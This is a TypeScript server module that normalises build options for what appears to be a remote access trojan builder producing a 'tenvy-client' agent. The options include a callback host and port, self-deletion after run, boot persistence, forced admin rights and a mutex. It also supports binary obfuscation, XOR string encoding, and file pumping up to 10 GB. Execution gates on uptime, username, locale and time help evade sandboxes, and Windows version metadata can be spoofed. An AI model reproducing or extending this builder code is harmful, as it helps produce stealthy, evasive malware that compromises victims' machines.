import { error } from '@sveltejs/kit';
import { ZodError } from 'zod';
import { randomBytes } from 'node:crypto';
import { agentModuleIds, agentModules } from '../../../../../shared/modules/index.js';
import {
	ALLOWED_EXTENSIONS_BY_OS,
	TARGET_ARCHITECTURES_BY_OS,
	TARGET_OS_VALUES,
	type BuildRequest,
	type TargetArch,
	type TargetOS,
	type WindowsFileInformation
} from '../../../../../shared/types/build';
import { buildRequestSchema } from '$lib/validation/build-schema';

export function generateXorKey(): string {
	return randomBytes(16).toString('hex');
}

export function obfuscateString(value: string, keyHex: string): string {
	const data = Buffer.from(value, 'utf8');
	const key = Buffer.from(keyHex, 'hex');
	const result = Buffer.alloc(data.length);
	for (let i = 0; i < data.length; i++) {
		result[i] = data[i] ^ key[i % key.length];
	}
	return result.toString('base64');
}

const allowedTargetOS = new Set<TargetOS>(TARGET_OS_VALUES);
const architectureMatrix = new Map<TargetOS, Set<TargetArch>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(TARGET_ARCHITECTURES_BY_OS[os])])
);
const extensionMatrix = new Map<TargetOS, Set<string>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
);
const moduleCatalog = new Set(agentModuleIds);
const moduleOrder = new Map(agentModules.map((module, index) => [module.id, index]));

export const mutexSanitizer = /[^A-Za-z0-9._-]/g;
const allowedFileInfoEntries = [
	['fileDescription', 'FileDescription'],
	['productName', 'ProductName'],
	['companyName', 'CompanyName'],
	['productVersion', 'ProductVersion'],
	['fileVersion', 'FileVersion'],
	['originalFilename', 'OriginalFilename'],
	['internalName', 'InternalName'],
	['legalCopyright', 'LegalCopyright']
] as const satisfies readonly [keyof WindowsFileInformation, string][];

const allowedFileInfoKeys = new Map(allowedFileInfoEntries);
const maxVersionComponent = 65535;
const maxMutexLength = 120;

type NormalizedAudioStreaming = 'enabled' | 'disabled' | 'unset';

const minWatchdogIntervalSeconds = 5;
const maxWatchdogIntervalSeconds = 86_400;
const maxFilePumperBytes = 10 * 1024 * 1024 * 1024;

export type NormalizedWatchdog = { enabled: true; intervalSeconds: number } | null;
export type NormalizedFilePumper = { enabled: true; targetBytes: number } | null;
export type NormalizedExecutionTriggers = {
	delaySeconds?: number;
	minUptimeMinutes?: number;
	allowedUsernames?: string[];
	allowedLocales?: string[];
	requireInternet: boolean;
	startTime?: string;
	endTime?: string;
} | null;

export type NormalizedCustomHeader = { key: string; value: string };
export type NormalizedCustomCookie = { name: string; value: string };

function resolveTargetOS(value?: string): TargetOS {
	if (!value) {
		return 'windows';
	}
	const normalized = value.toLowerCase().trim();
	if (allowedTargetOS.has(normalized as TargetOS)) {
		return normalized as TargetOS;
	}
	return 'windows';
}

function resolveTargetArch(value: string | undefined, targetOS: TargetOS): TargetArch {
	const options = architectureMatrix.get(targetOS) ?? new Set<TargetArch>(['amd64']);
	const fallback = options.values().next().value ?? 'amd64';
	if (!value) {
		return fallback;
	}
	const normalized = value.toLowerCase().trim();
	if (options.has(normalized as TargetArch)) {
		return normalized as TargetArch;
	}
	return fallback;
}

function resolveExtension(value: string | undefined, targetOS: TargetOS): string {
	const options = extensionMatrix.get(targetOS) ?? new Set(['.exe']);
	if (!value) {
		return options.values().next().value ?? '.exe';
	}

	const normalized = value.startsWith('.') ? value.toLowerCase() : `.${value.toLowerCase()}`;
	if (options.has(normalized)) {
		return normalized;
	}

	throw error(400, `Extension ${normalized} is not supported for ${targetOS} builds.`);
}

function sanitizeFilename(value: string, extension: string): string {
	const lowerExtension = extension.toLowerCase();
	let base = value;

	if (lowerExtension && base.toLowerCase().endsWith(lowerExtension)) {
		base = base.slice(0, -lowerExtension.length);
	}

	const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/\.+$/, '');
	const safeBase = cleaned.length > 0 ? cleaned : `tenvy-client-${Date.now()}`;

	return `${safeBase}${lowerExtension}`;
}

function sanitizePositiveInteger(
	value: string | number | undefined,
	min: number,
	max: number,
	label: string
): string | null {
	if (value === undefined || value === null) {
		return null;
	}

	const normalized = value.toString().trim();
	if (normalized === '') {
		return null;
	}

	if (!/^\d+$/.test(normalized)) {
		throw error(400, `${label} must be a positive integer.`);
	}

	const parsed = Number.parseInt(normalized, 10);
	if (!Number.isFinite(parsed)) {
		throw error(400, `${label} must be a valid number.`);
	}

	if (parsed < min || parsed > max) {
		throw error(400, `${label} must be between ${min} and ${max}.`);
	}

	return String(parsed);
}

function sanitizeMutexName(value: string | undefined): string {
	if (!value) {
		return '';
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return '';
	}
	const sanitized = trimmed.replace(mutexSanitizer, '_');
	return sanitized.slice(0, maxMutexLength);
}

function normalizeAudioStreaming(
	value: BuildRequest['audio'] | undefined
): NormalizedAudioStreaming {
	if (!value || value.streaming === undefined) {
		return 'unset';
	}

	return value.streaming ? 'enabled' : 'disabled';
}

type VersionParts = { Major: number; Minor: number; Patch: number; Build: number };

export type NormalizedFileInformation = Record<string, string>;

export function sanitizeFileInformationPayload(
	payload: BuildRequest['fileInformation'] | null | undefined
): NormalizedFileInformation {
	if (!payload) {
		return {};
	}
	const normalized: NormalizedFileInformation = {};
	for (const [key, label] of allowedFileInfoKeys.entries()) {
		const raw = payload[key];
		if (typeof raw !== 'string') {
			continue;
		}
		const trimmed = raw.trim();
		if (!trimmed) {
			continue;
		}
		normalized[label] = trimmed.slice(0, 256);
	}
	return normalized;
}

export function hasFileInformationPayload(payload: NormalizedFileInformation): boolean {
	return Object.keys(payload).length > 0;
}

export function parseVersionParts(value: string | undefined): VersionParts | null {
	if (!value) {
		return null;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return null;
	}
	const segments = trimmed.split('.').slice(0, 4);
	const numbers: number[] = [];
	for (const segment of segments) {
		const parsed = Number.parseInt(segment, 10);
		if (!Number.isFinite(parsed) || parsed < 0) {
			numbers.push(0);
			continue;
		}
		numbers.push(Math.min(parsed, maxVersionComponent));
	}
	while (numbers.length < 4) {
		numbers.push(0);
	}
	return {
		Major: numbers[0] ?? 0,
		Minor: numbers[1] ?? 0,
		Patch: numbers[2] ?? 0,
		Build: numbers[3] ?? 0
	};
}

export type NormalizedBuildRequest = {
	host: string;
	port: string;
	targetOS: TargetOS;
	targetArch: TargetArch;
	outputExtension: string;
	outputFilename: string;
	installationPath: string;
	meltAfterRun: boolean;
	startupOnBoot: boolean;
	developerMode: boolean;
	mutexName: string;
	compressBinary: boolean;
	obfuscateBinary: boolean;
	forceAdmin: boolean;
	pollIntervalMs: string | null;
	maxBackoffMs: string | null;
	shellTimeoutSeconds: string | null;
	fileIcon: BuildRequest['fileIcon'] | null | undefined;
	fileInformation: BuildRequest['fileInformation'] | null | undefined;
	audio: { streaming: NormalizedAudioStreaming };
	watchdog: NormalizedWatchdog;
	filePumper: NormalizedFilePumper;
	executionTriggers: NormalizedExecutionTriggers;
	customHeaders: NormalizedCustomHeader[];
	customCookies: NormalizedCustomCookie[];
	modules: string[];
	raw: BuildRequest;
};

export type NormalizedRuntimeConfig = {
	watchdog?: { intervalSeconds: number };
	filePumper?: { targetBytes: number };
	executionTriggers?: {
		delaySeconds?: number;
		minUptimeMinutes?: number;
		allowedUsernames?: string[];
		allowedLocales?: string[];
		requireInternet: boolean;
		startTime?: string;
		endTime?: string;
	};
	customHeaders?: NormalizedCustomHeader[];
	customCookies?: NormalizedCustomCookie[];
	modules?: string[];
} | null;

function formatZodError(err: ZodError): string {
	const issue = err.issues[0];
	if (!issue) {
		return 'Invalid build payload.';
	}
	const path = issue.path.join('.') || 'payload';
	return `${path}: ${issue.message}`;
}

export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequest {
	let parsed: BuildRequest;
	try {
		parsed = buildRequestSchema.parse(body);
	} catch (err) {
		if (err instanceof ZodError) {
			throw error(400, formatZodError(err));
		}
		throw error(400, 'Invalid build payload.');
	}

	const host = parsed.host.toString().trim();
	if (!host) {
		throw error(400, 'Host is required');
	}

	if (/\s/.test(host)) {
		throw error(400, 'Host cannot contain whitespace');
	}

	let port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
	if (!/^\d+$/.test(port)) {
		throw error(400, 'Port must be numeric');
	}

	const numericPort = Number.parseInt(port, 10);
	if (numericPort < 1 || numericPort > 65535) {
		throw error(400, 'Port must be between 1 and 65535');
	}
	port = String(numericPort);

	const targetOS = resolveTargetOS(parsed.targetOS);
	const targetArch = resolveTargetArch(parsed.targetArch, targetOS);
	const outputExtension = resolveExtension(parsed.outputExtension, targetOS);
	const outputFilename = sanitizeFilename(
		(parsed.outputFilename ?? 'tenvy-client').toString().trim(),
		outputExtension
	);
	const installationPath = (parsed.installationPath ?? '').toString().trim();
	const developerMode = parsed.developerMode !== false;
	const meltAfterRun = Boolean(parsed.meltAfterRun);
	const startupOnBoot = Boolean(parsed.startupOnBoot);
	const mutexName = sanitizeMutexName(parsed.mutexName);
	const compressBinary = Boolean(parsed.compressBinary);
	const obfuscateBinary = Boolean(parsed.obfuscateBinary);
	const forceAdmin = Boolean(parsed.forceAdmin);

	const pollIntervalMs = sanitizePositiveInteger(
		parsed.pollIntervalMs,
		1000,
		3_600_000,
		'Poll interval'
	);
	const maxBackoffMs = sanitizePositiveInteger(
		parsed.maxBackoffMs,
		1000,
		86_400_000,
		'Max backoff'
	);
	const shellTimeoutSeconds = sanitizePositiveInteger(
		parsed.shellTimeoutSeconds,
		5,
		7_200,
		'Shell timeout'
	);

	const watchdog = sanitizeWatchdog(parsed.watchdog ?? null);
	const filePumper = sanitizeFilePumper(parsed.filePumper ?? null);
	const executionTriggers = sanitizeExecutionTriggers(parsed.executionTriggers ?? null);
	const customHeaders = sanitizeCustomHeaders(parsed.customHeaders ?? null);
	const customCookies = sanitizeCustomCookies(parsed.customCookies ?? null);
	const modules = sanitizeModules(parsed.modules);

	return {
		host,
		port,
		targetOS,
		targetArch,
		outputExtension,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		obfuscateBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
		shellTimeoutSeconds,
		fileIcon: parsed.fileIcon ?? null,
		fileInformation: parsed.fileInformation ?? null,
		audio: { streaming: normalizeAudioStreaming(parsed.audio) },
		watchdog,
		filePumper,
		executionTriggers,
		customHeaders,
		customCookies,
		modules,
		raw: parsed
	} satisfies NormalizedBuildRequest;
}

function clamp(value: number, min: number, max: number): number {
	return Math.min(Math.max(value, min), max);
}

export function sanitizeWatchdog(
	payload: BuildRequest['watchdog'] | null | undefined
): NormalizedWatchdog {
	if (!payload || !payload.enabled) {
		return null;
	}
	const interval = clamp(
		Math.round(payload.intervalSeconds),
		minWatchdogIntervalSeconds,
		maxWatchdogIntervalSeconds
	);
	return { enabled: true, intervalSeconds: interval };
}

export function sanitizeFilePumper(
	payload: BuildRequest['filePumper'] | null | undefined
): NormalizedFilePumper {
	if (!payload || !payload.enabled) {
		return null;
	}
	const sanitizedTarget = Math.min(
		Math.max(Math.round(payload.targetBytes), 1),
		maxFilePumperBytes
	);
	return { enabled: true, targetBytes: sanitizedTarget };
}

function sanitizeStringArray(values: unknown): string[] {
	if (!Array.isArray(values)) {
		return [];
	}
	const normalized: string[] = [];
	for (const value of values) {
		if (typeof value !== 'string') {
			continue;
		}
		const trimmed = value.trim();
		if (!trimmed) {
			continue;
		}
		if (!normalized.includes(trimmed)) {
			normalized.push(trimmed);
		}
	}
	return normalized.slice(0, 32);
}

function normalizeIsoTimestamp(value: unknown): string | undefined {
	if (typeof value !== 'string') {
		return undefined;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return undefined;
	}
	const parsed = new Date(trimmed);
	if (Number.isNaN(parsed.getTime())) {
		return undefined;
	}
	return parsed.toISOString();
}

export function sanitizeExecutionTriggers(
	payload: BuildRequest['executionTriggers'] | null | undefined
): NormalizedExecutionTriggers {
	if (!payload) {
		return null;
	}

	const normalized: NonNullable<NormalizedExecutionTriggers> = {
		requireInternet: payload.requireInternet !== false
	};

	if (
		typeof payload.delaySeconds === 'number' &&
		Number.isFinite(payload.delaySeconds) &&
		payload.delaySeconds > 0
	) {
		normalized.delaySeconds = clamp(Math.round(payload.delaySeconds), 0, 86_400);
	}

	if (
		typeof payload.minUptimeMinutes === 'number' &&
		Number.isFinite(payload.minUptimeMinutes) &&
		payload.minUptimeMinutes > 0
	) {
		normalized.minUptimeMinutes = clamp(Math.round(payload.minUptimeMinutes), 0, 10_080);
	}

	const usernames = sanitizeStringArray(payload.allowedUsernames);
	if (usernames.length > 0) {
		normalized.allowedUsernames = usernames;
	}

	const locales = sanitizeStringArray(payload.allowedLocales).map((value) => value.toLowerCase());
	if (locales.length > 0) {
		normalized.allowedLocales = locales;
	}

	const startTime = normalizeIsoTimestamp(payload.startTime);
	if (startTime) {
		normalized.startTime = startTime;
	}

	const endTime = normalizeIsoTimestamp(payload.endTime);
	if (endTime) {
		normalized.endTime = endTime;
	}

	const hasExtraKeys =
		normalized.delaySeconds !== undefined ||
		normalized.minUptimeMinutes !== undefined ||
		normalized.allowedUsernames !== undefined ||
		normalized.allowedLocales !== undefined ||
		normalized.startTime !== undefined ||
		normalized.endTime !== undefined ||
		normalized.requireInternet === false;

	if (!hasExtraKeys) {
		return null;
	}

	return normalized;
}

function sanitizeHeaderValue(value: unknown): string | null {
	if (typeof value !== 'string') {
		return null;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return null;
	}
	return trimmed.slice(0, 256);
}

export function sanitizeCustomHeaders(
	payload: BuildRequest['customHeaders'] | null | undefined
): NormalizedCustomHeader[] {
	if (!Array.isArray(payload) || payload.length === 0) {
		return [];
	}
	const normalized: NormalizedCustomHeader[] = [];
	for (const header of payload as unknown[]) {
		if (!header || typeof header !== 'object') {
			continue;
		}
		const typedHeader = header as Partial<NonNullable<BuildRequest['customHeaders']>[number]>;
		const key = sanitizeHeaderValue(typedHeader?.key);
		const value = sanitizeHeaderValue(typedHeader?.value);
		if (!key || !value) {
			continue;
		}
		normalized.push({ key, value });
		if (normalized.length >= 32) {
			break;
		}
	}
	return normalized;
}

export function sanitizeCustomCookies(
	payload: BuildRequest['customCookies'] | null | undefined
): NormalizedCustomCookie[] {
	if (!Array.isArray(payload) || payload.length === 0) {
		return [];
	}
	const normalized: NormalizedCustomCookie[] = [];
	for (const cookie of payload as unknown[]) {
		if (!cookie || typeof cookie !== 'object') {
			continue;
		}
		const typedCookie = cookie as Partial<NonNullable<BuildRequest['customCookies']>[number]>;
		const name = sanitizeHeaderValue(typedCookie?.name);
		const value = sanitizeHeaderValue(typedCookie?.value);
		if (!name || !value) {
			continue;
		}
		normalized.push({ name, value });
		if (normalized.length >= 32) {
			break;
		}
	}
	return normalized;
}

function sanitizeModules(payload: BuildRequest['modules'] | null | undefined): string[] {
	if (!Array.isArray(payload)) {
		return [];
	}

	const normalized: string[] = [];
	const seen = new Set<string>();

	for (const value of payload) {
		if (typeof value !== 'string') {
			continue;
		}
		const trimmed = value.trim();
		if (!trimmed || seen.has(trimmed) || !moduleCatalog.has(trimmed)) {
			continue;
		}
		seen.add(trimmed);
		normalized.push(trimmed);
	}

	if (normalized.length <= 1) {
		return normalized;
	}

	return normalized.sort((a, b) => {
		const indexA = moduleOrder.get(a) ?? Number.MAX_SAFE_INTEGER;
		const indexB = moduleOrder.get(b) ?? Number.MAX_SAFE_INTEGER;
		return indexA - indexB;
	});
}

export function buildRuntimeConfigPayload(
	normalized: NormalizedBuildRequest
): NormalizedRuntimeConfig {
	const payload: NonNullable<NormalizedRuntimeConfig> = {};

	if (normalized.watchdog) {
		payload.watchdog = { intervalSeconds: normalized.watchdog.intervalSeconds };
	}
	if (normalized.filePumper) {
		payload.filePumper = { targetBytes: normalized.filePumper.targetBytes };
	}
	if (normalized.executionTriggers) {
		payload.executionTriggers = normalized.executionTriggers;
	}
	if (normalized.customHeaders.length > 0) {
		payload.customHeaders = normalized.customHeaders;
	}
	if (normalized.customCookies.length > 0) {
		payload.customCookies = normalized.customCookies;
	}
	if (Array.isArray(normalized.raw.modules)) {
		payload.modules = normalized.modules;
	}

	if (Object.keys(payload).length === 0) {
		return null;
	}
	return payload;
}

export function encodeRuntimeConfig(normalized: NormalizedBuildRequest): string | null {
	const payload = buildRuntimeConfigPayload(normalized);
	if (!payload) {
		return null;
	}
	return Buffer.from(JSON.stringify(payload), 'utf8').toString('base64');
}
